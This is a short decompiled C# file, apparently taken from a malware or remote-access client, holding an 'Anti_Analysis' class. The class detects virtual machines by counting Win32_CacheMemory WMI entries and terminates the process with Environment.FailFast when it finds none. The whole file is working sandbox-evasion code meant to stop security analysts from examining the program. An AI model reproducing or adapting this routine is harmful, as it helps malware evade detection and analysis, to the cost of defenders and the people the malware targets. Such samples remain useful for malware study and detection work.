using System;
using System.Management;
using System.Threading;

namespace Client.Helper
{
	// Token: 0x0200000C RID: 12
	internal class Anti_Analysis
	{
		// Token: 0x06000045 RID: 69 RVA: 0x00002245 File Offset: 0x00000445
		public static void RunAntiAnalysis()
		{
			if (Anti_Analysis.isVM_by_wim_temper())
			{
				Environment.FailFast(null);
			}
			Thread.Sleep(1000);
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00003B80 File Offset: 0x00001D80
		public static bool isVM_by_wim_temper()
		{
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new SelectQuery("Select * from Win32_CacheMemory"));
			int num = 0;
			foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				num++;
			}
			return num == 0;
		}
	}
}
